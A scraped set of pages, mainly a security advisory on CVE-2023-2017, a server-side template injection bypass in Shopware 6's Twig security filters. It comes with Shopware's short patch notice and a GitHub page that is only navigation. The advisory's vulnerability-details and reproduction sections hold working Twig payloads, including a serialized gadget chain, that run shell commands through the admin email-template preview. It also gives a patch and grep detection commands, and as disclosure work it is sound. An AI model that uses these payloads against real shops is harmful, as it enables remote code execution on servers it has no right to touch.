=== Content from starlabs.sg_851ccfbf_20250115_083111.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-2017) Shopware 6 Server-side Template Injection (SSTI) via Twig Security Extension

April 17, 2023 · 8 min · Ngo Wei Lin (@Creastery)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
* [Exploit Conditions:](#exploit-conditions)
* [Reproduction Steps:](#reproduction-steps)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | Shopware |
| --- | --- |
| **Vendor** | Shopware AG |
| **Severity** | High - Users with login access to Shopware Admin panel may be able to obtain remote code/command execution |
| **Affected Versions** | [v6.4.18.1](https://github.com/shopware/platform/tree/v6.4.18.1) <= [v6.4.20.0](https://github.com/shopware/platform/tree/v6.4.20.0), [v6.5.0.0-rc1](https://github.com/shopware/platform/tree/v6.5.0.0-rc1) <= [v6.5.0.0-rc4](https://github.com/shopware/platform/tree/v6.5.0.0-rc4) (Commit [facfc88](https://github.com/shopware/platform/commit/facfc886f326a591e0f77c45f34ef84c437ee4f1)) |
| **Tested Versions** | v6.4.20.0 (Latest stable version), v6.5.0.0-rc3 (Latest pre-release version) |
| **CVE Identifier** | CVE-2023-2017 |
| **CVE Description** | Server-side Template Injection (SSTI) in Shopware 6 (<= v6.4.20.0, v6.5.0.0-rc1 <= v6.5.0.0-rc4), affecting both shopware/core and shopware/platform GitHub repositories, allows remote attackers with access to a Twig environment without the Sandbox extension to bypass the validation checks in `Shopware\Core\Framework\Adapter\Twig\SecurityExtension` and call any arbitrary PHP function and thus execute arbitrary code/commands via usage of fully-qualified names, supplied as array of strings, when referencing callables. Users are advised to upgrade to v6.4.20.1 to resolve this issue. This is a bypass of CVE-2023-22731. |
| **CWE Classification(s)** | CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |
| **CAPEC Classification(s)** | CAPEC-242: Code Injection |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 8.8 (High)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | Low |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | High |
| **Integrity (I)** | High |
| **Availability (A)** | High |

## Product Overview:[#](#product-overview)

Shopware is an open source commerce platform based on Symfony Framework and Vue js. The build-in Shopware 6 Storefront is based on [Twig](https://twig.symfony.com/) and [Bootstrap](https://getbootstrap.com/). Users may use extensions (previously referred to as plugins) to implement custom themes for their storefront by overriding the default Twig template files, and then enabling the custom theme extension using the included Shopware 6 Administration panel.

## Vulnerability Summary:[#](#vulnerability-summary)

***Note:** This is a bypass of CVE-2023-22731 (tracked as issue [NEXT-24667](https://docs.shopware.com/en/shopware-6-en/security-updates/security-update-01-2023) by Shopware).*

There is a bypass for the validation checks enforced by the `Shopware\Core\Framework\Adapter\Twig\SecurityExtension` used to prevent execution of arbitrary PHP functions using default filters in Twig, such as `map()`, `filter()`, `reduce()` and `sort()`. The `SecurityExtension` class introduced in commit [89d1ea1](https://github.com/shopware/platform/commit/89d1ea154689cb6202e0d3a0ceeae0febb0c09e1) attempts to address CVE-2023-22731 by overriding the `map()`, `filter()`, `reduce()` and `sort()` Twig filters (enabled by default) and ensuring that the callable is within the list of permitted PHP functions to be executed. However, there is a logic flaw whereby validation against the list of permitted functions is only performed if the argument passed to filter is a string. Passing an array as a callable argument allows the validation check to be skipped.

Consequently, this allows a remote attacker with access to a Twig environment to call any arbitrary PHP function and thus execute arbitrary code/commands via usage of fully-qualified names, supplied as arrays of strings, when referencing callables.

## Vulnerability Details:[#](#vulnerability-details)

The vulnerability can be found in the `SecurityExtension` class declared in [`src/Core/Framework/Adapter/Twig/SecurityExtension.php`](https://github.com/shopware/platform/commit/1c1ff8499563cf1ce976936d75a7b1c95f6038fc#diff-a9b30d8a83584a78835bf2fa8a45c985ac413fb10ac2e77313ef0818894ff4fbR23-R113):

```
...
class SecurityExtension extends AbstractExtension
{
    ...
    /**
     * @return TwigFilter[]
     */
    public function getFilters(): array
    {
        return [
            new TwigFilter('map', [$this, 'map']),
            new TwigFilter('reduce', [$this, 'reduce']),
            new TwigFilter('filter', [$this, 'filter']),
            new TwigFilter('sort', [$this, 'sort']),
        ];
    }
    ...
    public function map(iterable $array, string|callable|\Closure $function): array
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [1]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }
        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value); // [2]
        }
        return $result;
    }
    ...
    public function reduce(iterable $array, string|callable|\Closure $function, mixed $initial = null): mixed
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [3]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }
        if (!\is_array($array)) {
            $array = iterator_to_array($array);
        }
        // @phpstan-ignore-next-line
        return array_reduce($array, $function, $initial); // [4]
    }
    ...
    public function filter(iterable $array, string|callable|\Closure $arrow): iterable
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [5]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }
        if (\is_array($array)) {
            // @phpstan-ignore-next-line
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // [6]
        }
        // @phpstan-ignore-next-line
        return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
    }
    ...
    public function sort(iterable $array, string|callable|\Closure|null $arrow = null): array
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [7]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }
        if ($array instanceof \Traversable) {
            $array = iterator_to_array($array);
        }
        if ($arrow !== null) {
            // @phpstan-ignore-next-line
            uasort($array, $arrow); //[8]
        } else {
            asort($array);
        }
        return $array;
    }
}

```

At [1], the `$function` parameter contains the argument supplied to the filter. For example, it may refer to `"funcname"` in `{{ array|filter("funcname") }}` or the closure (a.k.a. arrow function) `el => el != 'exclude'` in `{{ array|filter(el => el != 'exclude') }}`. Taking a closer look at the condition at [1], it can be observed that non-string arguments passes the validation check.

Notice that the validation check is only invoked if `$function` is a string. As such, non-string arguments may be passed to [2] due to the absence of type enforcement at [1]. At [2], variable functions (i.e. `$function($value)`) is invoked, thereby allowing arbitrary PHP functions to be executed. Largely identical code pattern can also be observed for the `reduce()` filter (at [3] and [4]), `filter()` filter (at [5] and [6]) and `sort()` filter (at [7] and [8]).

A common mistake that developers make is assuming that the `callable` type refers to a `string` type. This is untrue, and it is [well documented in the PHP Manual](https://www.php.net/manual/en/language.types.callable.php):

> A method of an instantiated object is passed as an **array containing an object at index 0 and the method name at index 1**. Accessing protected and private methods from within a class is allowed.
> Static class methods can also be passed without instantiating an object of that class by either, **passing the class name instead of an object at index 0, or passing `ClassName::methodName`**.

This means that all of the following variable function calls are valid:

```
// Type 1: Simple callback -- invokes system("id")
$func = "system";
$func("id")
// Type 2: Static class method call -- invokes Class::staticMethod($arg)
$func = $array("Class", "staticMethod");
$func($arg);
// Type 3: Object method call -- invokes $obj->method($arg)
$func = $array($obj, "method"));
$func($arg);

```

Going back to [1], if `$arrow` is an `array` instead of a `string` or `closure`, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Shopware’s codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:

```
// Gadget 1: Using \Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress() to invoke unserialize()
// Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system 'id'
// Compressed payload is generated using:
// $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
{{ ["\x78\x9C\x65\x90\x4D\x4F\xC3\x30\x0C\x86\x77\xE6\x67\xF8\xC8\xA9\x49\x61\x30\xE7\x86\x86\xE0\x50\x34\x09\xAE\x93\xA6\x7E\x78\xC5\x53\xDA\x4C\x49\x3A\xF1\xA1\xFE\x77\x92\x06\x8D\xA2\xDD\xEC\xF7\x8D\x5F\x3F\xCE\x06\xE5\x3D\xC2\x8B\xE9\x8D\x36\xED\xF6\xB9\xEC\x1B\x4D\x76\xFB\x64\xCD\x70\xFC\x6D\x00\x05\x7E\x3B\x14\x02\x61\x71\xBD\x78\x4F\xA2\x03\x55\x46\x9D\x31\x53\x1B\x94\xAB\xCB\x88\x87\x61\xBF\x27\x7B\xCE\x58\x4E\x19\xD9\x3C\x03\x94\xC5\x5C\x05\x35\x9F\xD4\x6A\x1A\x78\xE3\x2F\x02\xC5\x28\xA2\x71\x33\x33\x0A\xEE\xD8\x47\x27\x0B\xCE\x6A\x66\xFC\x23\x11\x77\x7F\x24\x85\x69\x5F\xA9\x36\xB6\x01\x94\x71\xFB\x2D\x82\xA6\x13\x69\x50\x8F\x28\x66\xC4\x45\x14\x71\x4D\xD5\xD0\x82\x9A\x9E\x75\xFC\x41\x4D\xAC\x25\x02\x87\x62\x1C\xCF\x30\xDC\xB3\xE7\x52\x07\xCA\xA0\x57\x09\x33\xF1\x1F\xAD\xA9\xC9\x39\x93\xFE\x26\x4F\x44\xC1\x0D\x79\x2D\xF9\x9D\xA9\x0E\x54\xFB\xDD\xA9\x8C\x7E\xBA\x2F\xCC\x51\xDF\xC4\x4E\x86\x6E\x89\xE0\x3E\x9D\xA7\x2E\xEE\x1B\xC7\xAB\x1F\x89\x25\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
// Gadget 2: Using \Symfony\Component\VarDumper\Vardumper::setHandler() and \Symfony\Component\VarDumper\Vardumper::dump() to invoke system("id"):
{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
{{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length }}
// Gadget 3: Using \Symfony\Component\Process\Process::fromShellCommandline() to invoke proc_open("id > /tmp/pwned.txt"):
{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}

```
## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited if the attacker has access to:

1. an administrator account, or
2. a non-administrative user account with permissions to create/edit Twig templates, such as:
   * `Settings > Email templates` permissions
   * `Content > Themes` permissions
   * `Additional Permissions > Manage Extensions` permissions

## Reproduction Steps:[#](#reproduction-steps)

For simplicity, the following proof-of-concept uses the administrator account to demonstrate how the vulnerability can be exploited using `Email templates`.

1. Navigate to `http://<shopware_target>/admin#/sw/mail/template/index` and login to an administrator account.
2. Click the `...` button for the first template (e.g. `Cancellation invoice`), and click the Edit button.
3. Under the `Mail text` section, enter the following payload for the `HTML` text area:
   ```
   <!--
   Gadget 1: Using \Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress() to invoke unserialize()
   Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system 'id'
   Compressed payload is generated using:
   $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
   -->
   {{ ["\x78\x9C\x65\x90\x4D\x4F\xC3\x30\x0C\x86\x77\xE6\x67\xF8\xC8\xA9\x49\x61\x30\xE7\x86\x86\xE0\x50\x34\x09\xAE\x93\xA6\x7E\x78\xC5\x53\xDA\x4C\x49\x3A\xF1\xA1\xFE\x77\x92\x06\x8D\xA2\xDD\xEC\xF7\x8D\x5F\x3F\xCE\x06\xE5\x3D\xC2\x8B\xE9\x8D\x36\xED\xF6\xB9\xEC\x1B\x4D\x76\xFB\x64\xCD\x70\xFC\x6D\x00\x05\x7E\x3B\x14\x02\x61\x71\xBD\x78\x4F\xA2\x03\x55\x46\x9D\x31\x53\x1B\x94\xAB\xCB\x88\x87\x61\xBF\x27\x7B\xCE\x58\x4E\x19\xD9\x3C\x03\x94\xC5\x5C\x05\x35\x9F\xD4\x6A\x1A\x78\xE3\x2F\x02\xC5\x28\xA2\x71\x33\x33\x0A\xEE\xD8\x47\x27\x0B\xCE\x6A\x66\xFC\x23\x11\x77\x7F\x24\x85\x69\x5F\xA9\x36\xB6\x01\x94\x71\xFB\x2D\x82\xA6\x13\x69\x50\x8F\x28\x66\xC4\x45\x14\x71\x4D\xD5\xD0\x82\x9A\x9E\x75\xFC\x41\x4D\xAC\x25\x02\x87\x62\x1C\xCF\x30\xDC\xB3\xE7\x52\x07\xCA\xA0\x57\x09\x33\xF1\x1F\xAD\xA9\xC9\x39\x93\xFE\x26\x4F\x44\xC1\x0D\x79\x2D\xF9\x9D\xA9\x0E\x54\xFB\xDD\xA9\x8C\x7E\xBA\x2F\xCC\x51\xDF\xC4\x4E\x86\x6E\x89\xE0\x3E\x9D\xA7\x2E\xEE\x1B\xC7\xAB\x1F\x89\x25\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}

   ```
4. In the right-sidebar, click the `Show Preview` button. Observe that the `id` shell command is executed successfully:
   ![](/advisories/23/images/CVE-2023-2017.png)

## Suggested Mitigations:[#](#suggested-mitigations)

Patch the logic flaw in the `SecurityExtension` class declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php` to ensure that the parameter passed to the respective filter functions must either be a `string` or a `Closure` as such:

An sample patch is shown below for the `map()` filter:

```
    public function map(iterable $array, string|callable|\Closure $function): array
    {
-       if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) {
+       if (!($function instanceof \Closure) && (!(\is_string($function) && \in_array($function, $this->allowedPHPFunctions, true))) {
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }
        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value);
        }
        return $result;
    }

```
## Detection Guidance:[#](#detection-guidance)

The following strategies may be used to detect potential exploitation attempts.

1. Searching within Twig cache/compiled Twig template files using the following shell command:

   `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' --exclude \*url_matching_routes.php /path/to/webroot/var/cache/`
2. Searching within custom apps/plugins/themes using the following shell command:

   `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' /path/to/webroot/custom/`

Note that it is not possible to detect indicators of compromise reliably using the Shopware log file (located at `/path/to/webroot/var/log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.

## Credits:[#](#credits)

Ngo Wei Lin ([@Creastery](https://twitter.com/Creastery)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-04-10 Vendor Disclosure
* 2023-04-11 Initial Vendor Contact
* 2023-04-11 Vendor Patch Release
* 2023-04-17 Public Release

[« Prev

(CVE-2023-3514) RazerCentralSerivce unsafe NamedPipe permission Escalation of Privilege Vulnerability](https://starlabs.sg/advisories/23/23-3514/)
[Next »

(CVE-2022-44667) Windows CDirectMusicPortDownload Integer Overflow Vulnerability](https://starlabs.sg/advisories/22/22-44667/)

© 2025 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)



=== Content from docs.shopware.com_d3a7572b_20250115_083106.html ===


* [shopware.com](https://www.shopware.com/en/ "Shopware Website")
* [Blog](https://www.shopware.com/en/news/ "Shopware blog")
* [Company](https://www.shopware.com/en/company/ "Company")
* [Jobs](https://www.shopware.com/en/jobs/ "Jobs")
* [Contact](https://www.shopware.com/en/contact/ "Contact")
* [Account](https://account.shopware.com/?lang=en "Shopware Account")
* [DE](/de/shopware-6-de/sicherheitsupdates/security-update-04-2023)[EN](/en/shopware-6-en/security-updates/security-update-04-2023)
[![Shopware Docs Logo](https://assets.shopware.com/media/logos/extended/shopware_docs_horizontal_white.svg)](/en)[DE](/de/shopware-6-de/sicherheitsupdates/security-update-04-2023)[EN](/en/shopware-6-en/security-updates/security-update-04-2023)[Show all results](/en/search)

* [![YouTube](/build/images/social-media/icon-yt.6afa92ed.svg)](https://www.youtube.com/channel/UC-xCvUIPOXx6o4ZydnwIsng "Shopware Knowledge YouTube Channel")
* [![Twitter](/build/images/social-media/icon-tw.b50c68de.svg)](https://twitter.com/shopwareDevs "Shopware Developer Twitter Channel")
* [![GitHub](/build/images/social-media/icon-gh.39a3c8c9.svg)](https://github.com/shopware "Shopware GitHub")
* [![Slack](/build/images/social-media/icon-sl.dea81964.svg)](https://slack.shopware.com/ "Shopware Community on Slack")

* [Shopware 6](/en/shopware-6-en "Shopware 6 - Users")
* [Shopware 6Developers](https://developer.shopware.com/)
* [Shopware 5](/en/shopware-5-en "Shopware 5 - Users")
* [Shopware 5Developers](https://developers.shopware.com/ "Shopware 5 - Developers")
* [Account](/en/shopware-account-en "Shopware Account")

* [Shopware 6 - Users](/en/shopware-6-en "Shopware 6 - Users")* [Getting Started](/en/shopware-6-en/getting-started "Getting Started")
  * [Migration](/en/migration-en "Migration")
  * [Features](/en/shopware-6-en/features "Features")
  * [Configuration](/en/shopware-6-en/configuration "Configuration")
  * [Shopware in the cloud](/en/shopware-6-en/in-the-cloud "Shopware in the cloud")
  * [Shopware Extensions](/en/shopware-6-en/extensions "Shopware Extensions")
  * [Commercial Features](/en/shopware-6-en/features/commercial "Commercial Features")
  * [Spatial Commerce](/en/shopware-6-en/spatial-commerce "Spatial Commerce")
  * [Tutorials & FAQs](/en/shopware-6-en/tutorials-and-faq "Tutorials & FAQs")
  * [Update Guides](/en/shopware-6-en/update-guides "Update Guides")
  * [Security Updates](/en/security-updates "Security Updates")
    + [Security Update 01/2024](/en/shopware-6-en/security-updates/security-update-01-2024?category=security-updates "Security Update 01/2024")
    + [Security Update 07/2023](/en/shopware-6-en/security-updates/security-update-07-2023?category=security-updates "Security Update 07/2023")
    + [Security Update 05/2023](/en/shopware-6-en/security-updates/security-update-05-2023?category=security-updates "Security Update 05/2023")
    + [Security Update 04/2023](/en/shopware-6-en/security-updates/security-update-04-2023?category=security-updates "Security Update 04/2023")
    + [Security Update 01/2023](/en/shopware-6-en/security-updates/security-update-01-2023?category=security-updates "Security Update 01/2023")
    + [Security Update 10/2022](/en/shopware-6-en/security-updates/security-update-10-2022?category=security-updates "Security Update 10/2022")
    + [Security Update 04/2022](/en/shopware-6-en/security-updates/security-update-04-2022?category=security-updates "Security Update 04/2022")
    + [Security Update 03/2022](/en/shopware-6-en/security-updates/security-update-03-2022?category=security-updates "Security Update 03/2022")
    + [Security Update 02/2022](/en/shopware-6-en/security-updates/security-update-02-2022?category=security-updates "Security Update 02/2022")
    + [Security Update 11/2021](/en/shopware-6-en/security-updates/security-update-11-2021?category=security-updates "Security Update 11/2021")
    + [Security Update 08/2021](/en/shopware-6-en/security-updates/security-update-08-2021?category=security-updates "Security Update 08/2021")
    + [Security Update 24/06/2021](/en/shopware-6-en/security-updates/security-update-24-06-2021?category=security-updates "Security Update 24/06/2021")
    + [Security Update 06/2021](/en/shopware-6-en/security-updates/security-update-06-2021?category=security-updates "Security Update 06/2021")
    + [Security Update 04/2021](/en/shopware-6-en/security-updates/security-update-04-2021?category=security-updates "Security Update 04/2021")
    + [Security Update 03/2021](/en/shopware-6-en/security-updates/security-update-03-2021?category=security-updates "Security Update 03/2021")
    + [Security Update 02/2021](/en/shopware-6-en/security-updates/security-update-02-2021?category=security-updates "Security Update 02/2021")
    + [Security Update 12/2020](/en/shopware-6-en/security-updates/security-update-12-2020?category=security-updates "Security Update 12/2020")
    + [Security Update 10/2020](/en/shopware-6-en/security-updates/security-update-10-2020?category=security-updates "Security Update 10/2020")
    + [Security Update 09/2020](/en/shopware-6-en/security-updates/security-update-09-2020?category=security-updates "Security Update 09/2020")
    + [Security Update 07/2020](/en/shopware-6-en/security-updates/security-update-07-2020?category=security-updates "Security Update 07/2020")
    + [Security Update 05/2020](/en/shopware-6-en/security-updates/security-update-05-2020?category=security-updates "Security Update 05/2020")
    + [Security Update 03/2020](/en/shopware-6-en/security-updates/security-update-03-2020?category=security-updates "Security Update 03/2020")
    + [Security Update 02/2020](/en/shopware-6-en/security-updates/security-update-02-2020?category=security-updates "Security Update 02/2020")
    + [Security Update 08/2019](/en/shopware-6-en/security-updates/security-update-08-2019?category=security-updates "Security Update 08/2019")

---

* [Shopware 6 - Developers](/en/shopware-platform-dev-en "Shopware 6 - Developers")
* [Shopware 5 - Users](/en/shopware-5-en "Shopware 5 - Users")
* [Shopware 5 - Developers](https://developers.shopware.com/ "Shopware 5 - Developers")
* [Shopware Account](/en/shopware-account-en "Shopware Account")

---

* [shopware.com](https://www.shopware.com/en/ "Shopware Website")
* [Blog](https://www.shopware.com/en/news/ "Shopware blog")
* [Company](https://www.shopware.com/en/company/ "Company")
* [Jobs](https://www.shopware.com/en/jobs/ "Jobs")
* [Contact](https://www.shopware.com/en/contact/ "Contact")
* [Account](https://account.shopware.com/?lang=en "Shopware Account")

* [Getting Started](/en/shopware-6-en/getting-started "Getting Started")
* [Migration](/en/migration-en "Migration")
* [Features](/en/shopware-6-en/features "Features")
* [Configuration](/en/shopware-6-en/configuration "Configuration")
* [Shopware in the cloud](/en/shopware-6-en/in-the-cloud "Shopware in the cloud")
* [Shopware Extensions](/en/shopware-6-en/extensions "Shopware Extensions")
* [Commercial Features](/en/shopware-6-en/features/commercial "Commercial Features")
* [Spatial Commerce](/en/shopware-6-en/spatial-commerce "Spatial Commerce")
* [Tutorials & FAQs](/en/shopware-6-en/tutorials-and-faq "Tutorials & FAQs")
* [Update Guides](/en/shopware-6-en/update-guides "Update Guides")
* [Security Updates](/en/security-updates "Security Updates")
  + [Security Update 01/2024](/en/shopware-6-en/security-updates/security-update-01-2024?category=security-updates "Security Update 01/2024")
  + [Security Update 07/2023](/en/shopware-6-en/security-updates/security-update-07-2023?category=security-updates "Security Update 07/2023")
  + [Security Update 05/2023](/en/shopware-6-en/security-updates/security-update-05-2023?category=security-updates "Security Update 05/2023")
  + [Security Update 04/2023](/en/shopware-6-en/security-updates/security-update-04-2023?category=security-updates "Security Update 04/2023")
  + [Security Update 01/2023](/en/shopware-6-en/security-updates/security-update-01-2023?category=security-updates "Security Update 01/2023")
  + [Security Update 10/2022](/en/shopware-6-en/security-updates/security-update-10-2022?category=security-updates "Security Update 10/2022")
  + [Security Update 04/2022](/en/shopware-6-en/security-updates/security-update-04-2022?category=security-updates "Security Update 04/2022")
  + [Security Update 03/2022](/en/shopware-6-en/security-updates/security-update-03-2022?category=security-updates "Security Update 03/2022")
  + [Security Update 02/2022](/en/shopware-6-en/security-updates/security-update-02-2022?category=security-updates "Security Update 02/2022")
  + [Security Update 11/2021](/en/shopware-6-en/security-updates/security-update-11-2021?category=security-updates "Security Update 11/2021")
  + [Security Update 08/2021](/en/shopware-6-en/security-updates/security-update-08-2021?category=security-updates "Security Update 08/2021")
  + [Security Update 24/06/2021](/en/shopware-6-en/security-updates/security-update-24-06-2021?category=security-updates "Security Update 24/06/2021")
  + [Security Update 06/2021](/en/shopware-6-en/security-updates/security-update-06-2021?category=security-updates "Security Update 06/2021")
  + [Security Update 04/2021](/en/shopware-6-en/security-updates/security-update-04-2021?category=security-updates "Security Update 04/2021")
  + [Security Update 03/2021](/en/shopware-6-en/security-updates/security-update-03-2021?category=security-updates "Security Update 03/2021")
  + [Security Update 02/2021](/en/shopware-6-en/security-updates/security-update-02-2021?category=security-updates "Security Update 02/2021")
  + [Security Update 12/2020](/en/shopware-6-en/security-updates/security-update-12-2020?category=security-updates "Security Update 12/2020")
  + [Security Update 10/2020](/en/shopware-6-en/security-updates/security-update-10-2020?category=security-updates "Security Update 10/2020")
  + [Security Update 09/2020](/en/shopware-6-en/security-updates/security-update-09-2020?category=security-updates "Security Update 09/2020")
  + [Security Update 07/2020](/en/shopware-6-en/security-updates/security-update-07-2020?category=security-updates "Security Update 07/2020")
  + [Security Update 05/2020](/en/shopware-6-en/security-updates/security-update-05-2020?category=security-updates "Security Update 05/2020")
  + [Security Update 03/2020](/en/shopware-6-en/security-updates/security-update-03-2020?category=security-updates "Security Update 03/2020")
  + [Security Update 02/2020](/en/shopware-6-en/security-updates/security-update-02-2020?category=security-updates "Security Update 02/2020")
  + [Security Update 08/2019](/en/shopware-6-en/security-updates/security-update-08-2019?category=security-updates "Security Update 08/2019")
# Security Update 04/2023

## General Information

In this security release, we have resolved a vulnerability of threat level "critical". Affected are all Shopware versions up to and including 6.4.20.0. The following issues have been fixed with this security update:

NEXT-26140 - Improve Twig Security Extension to verify PHP Closures in Twig Templates ([GHSA-7v2v-9rm4-7m8f](https://github.com/shopware/platform/security/advisories/GHSA-7v2v-9rm4-7m8f))

We recommend updating to the current version 6.4.20.1. You can update to 6.4.20.1 via the auto-updater or manually via the download package.
<https://www.shopware.com/en/download/#shopware-6>

For older versions, corresponding security measures are also available via the central security plugin for Shopware 6.
<https://store.shopware.com/en/detail/index/sArticle/518463/number/Swag136939272659>

#### Was this article helpful?

Rate
#### Version

6.1.0 - 6.4.20.0
## Contents

* [General Information](#general-information)
[Back to top](#start "Back to top")[![Shopware](https://assets.shopware.com/media/logos/shopware_logo_white.svg)](/en)

* [Legal notice](https://www.shopware.com/en/legal-notice/ "Legal notice")
* [Terms and Conditions](https://www.shopware.com/en/gtc/ "Terms and Conditions")
* [Developer newsletter](https://www.shopware.com/en/newsletter "Developer newsletter")
* [Shopware Website](https://www.shopware.com/en/ "Shopware Website")
* Cookie settings
[![YouTube](/build/images/social-media/icon-yt.6afa92ed.svg)](https://www.youtube.com/channel/UC-xCvUIPOXx6o4ZydnwIsng "Shopware Knowledge YouTube Channel")[![Twitter](/build/images/social-media/icon-tw.b50c68de.svg)](https://twitter.com/shopwareDevs "Shopware Developer Twitter Channel")[![GitHub](/build/images/social-media/icon-gh.39a3c8c9.svg)](https://github.com/shopware "Shopware GitHub")[![Slack](/build/images/social-media/icon-sl.dea81964.svg)](https://slack.shopware.com/ "Shopware Community on Slack")Copyright © shopware AG - All rights reserved

=== Content from github.com_22c5fe02_20250115_083109.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fshopware%2Fshopware%2Fsecurity%2Fadvisories%2FGHSA-7v2v-9rm4-7m8f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

